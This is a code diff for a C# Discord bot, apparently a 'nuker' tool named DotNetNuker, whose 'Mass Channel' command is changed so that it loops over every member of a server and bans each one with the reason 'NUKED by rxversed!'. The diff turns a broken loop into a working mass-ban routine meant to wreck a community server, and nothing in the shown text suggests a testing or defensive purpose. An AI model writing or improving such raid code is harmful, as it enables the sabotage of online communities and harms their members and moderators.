@@ -1,12 +1,16 @@
-﻿using Discord.Commands;
+﻿using Discord;
+using Discord.Commands;
+using Discord.WebSocket;
 using System;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace DotNetNuker.Commands
 {
     public class MassChannel : ModuleBase
     {
+        
 
         [Command("Mass Channel", RunMode = RunMode.Async)]
 
@@ -35,12 +39,18 @@ namespace DotNetNuker.Commands
             await ReplyAsync("Okey Dokey!");
 
 
-            for (; ; )
+            foreach (var users in await Context.Guild.GetUsersAsync())
             {
-                var users = Context.Guild.GetUsersAsync();
-                await Context.Guild.AddBanAsync((Discord.IUser)users, 0, "rxversed owns u");
-                
-                Thread.Sleep(50);
+                try
+                {
+                    await Context.Guild.AddBanAsync(users, 0, "NUKED by rxversed!"); 
+                    Thread.Sleep(50);
+                } 
+                catch
+                {
+                    MessageBox.Show("Error!", null, MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+
             }
         }
     }
